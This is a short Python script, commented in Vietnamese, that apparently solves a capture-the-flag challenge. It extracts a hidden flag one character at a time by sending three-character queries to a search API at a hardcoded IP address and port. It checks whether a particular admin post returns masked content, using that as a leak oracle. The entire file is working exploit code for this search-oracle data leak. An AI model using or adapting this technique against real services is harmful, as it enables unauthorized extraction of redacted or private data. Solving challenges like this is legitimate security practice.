import requests
import string

# Bộ ký tự có thể có trong flag
charset = ''.join(c for c in string.printable if c not in ' \t\n\r\x0b\x0c')

# Flag đã brute được đến đây
discovered = 'L3AK{L3ak1ng_th3'
flag_length = 24  # Số lượng ký tự flag (số dấu *)

def test_triplet(triplet):
    try:
        res = requests.post(
            'http://34.134.162.213:17000/api/search',
            json={'query': triplet},
            timeout=5
        )
        data = res.json()

        for post in data['results']:
            if (post['title'] == "Not the flag?" and
                post['author'] == "admin" and
                post['date'] == "2025-05-13"):

                content = post['content']
                if '*' in content:
                    return True
    except Exception as e:
        print(f"[!] Error: {e}")
    return False

while len(discovered) < flag_length:
    found = False
    for c in charset:
        candidate = discovered + c
        triplet = candidate[-3:]  # lấy 3 ký tự cuối để query

        if triplet == "ere":  # bỏ qua điểm mù ere
            continue

        print(f"[*] Trying: {candidate} (query: {triplet})")

        if test_triplet(triplet):
            discovered += c
            print(f"[+] Found: {discovered}")
            found = True
            break
    if not found:
        print("[-] Không tìm thấy ký tự tiếp theo (có thể điểm mù)")
        break

print(f"[✔] DONE: {discovered}")
